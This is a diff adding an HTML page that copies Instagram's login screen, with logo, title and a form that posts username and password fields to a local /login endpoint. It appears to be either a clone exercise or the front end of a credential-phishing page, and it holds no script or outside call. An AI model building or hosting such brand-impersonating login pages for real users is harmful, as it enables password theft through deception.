@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+    <div class="ig-container">
+        <div class="ig-card">
+            <div class="ig-logo">
+                <img src="/assets/logo.png" alt="Instagram" height="51">
+            </div>
+            <form action="/login" method="POST">
+                <div class="ig-input-group">
+                    <input type="text" name="email" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="ig-input-group">
+                    <input type="password" name="pass" placeholder="Password" required>
+                </div>
+                <button type="submit" class="ig-login-btn">Log In</button>
+                <div class="ig-divider">
+                    <span>OR</span>
+                </div>
+                <a href="#" class="ig-fb-link">
+                    <span class="ig-fb-icon">f</span>
+                    Log in with Facebook
+                </a>
+                <a href="#" class="ig-forgot">Forgot password?</a>
+            </form>
+        </div>
+        <div class="ig-signup-card">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="ig-apps">
+            <p>Get the app.</p>
+            <div class="ig-app-badges">
+                <span class="ig-badge">Google Play</span>
+                <span class="ig-badge">Microsoft Store</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
